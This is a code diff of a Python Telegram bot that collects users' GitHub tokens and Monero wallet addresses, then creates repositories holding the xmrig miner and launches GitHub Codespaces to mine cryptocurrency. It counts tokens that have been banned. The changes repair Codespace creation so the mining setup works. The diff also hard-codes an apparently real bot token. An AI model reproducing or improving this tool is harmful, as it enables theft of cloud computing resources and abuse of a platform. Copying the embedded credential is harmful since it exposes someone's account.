@@ -6,7 +6,7 @@ import base64
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-BOT_TOKEN = "8067230426:AAGmGeSe7P7hlnvoCPsw7mDpm1qbtnhASq0"  # <- Replace with your bot token
+BOT_TOKEN = "8067230426:AAGmGeSe7P7hlnvoCPsw7mDpm1qbtnhASq0"
 
 conn = sqlite3.connect("data.db", check_same_thread=False)
 c = conn.cursor()
@@ -57,13 +57,19 @@ chmod +x xmrig
         for fname, content in files.items():
             upload_file(github_token, username, repo_name, fname, content)
 
-        time.sleep(8)  # ⏳ Ensure repo is fully available before Codespace start
+        time.sleep(8)  # wait for GitHub to recognize new repo
+
+        # 🔥 Fix: Use repository_id instead of "username/repo"
+        repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers).json()
+        repo_id = repo_data.get("id")
+        if not repo_id:
+            continue
 
         resp = requests.post(
             "https://api.github.com/user/codespaces",
             headers={**headers, "Accept": "application/vnd.github+json"},
             json={
-                "repository": f"{username}/{repo_name}",
+                "repository_id": repo_id,
                 "ref": "main",
                 "location": "WestUs2",
                 "machine": "standardLinux"
@@ -73,7 +79,6 @@ chmod +x xmrig
 
     return username, True
 
-# Telegram command: /wallet <XMR_wallet>
 async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if len(context.args) != 1:
@@ -84,7 +89,6 @@ async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.commit()
     await update.message.reply_text("✅ Wallet saved! You're ready to mine.")
 
-# Telegram command: /token <ghp_...>
 async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not context.args:
@@ -109,7 +113,6 @@ async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(reply.strip())
 
-# Telegram command: /check
 async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
@@ -123,10 +126,9 @@ async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             banned += 1
     total = active + banned
     await update.message.reply_text(
-        f"👤 Your GitHub Token Status\\n━━━━━━━━━━━━━━━\\n✅ Active: {active}\\n❌ Banned: {banned}\\n💾 Total: {total}\\n━━━━━━━━━━━━━━━"
+        f"👤 Your GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}\n━━━━━━━━━━━━━━━"
     )
 
-# Bot run
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 app.add_handler(CommandHandler("wallet", wallet))
 app.add_handler(CommandHandler("token", token))
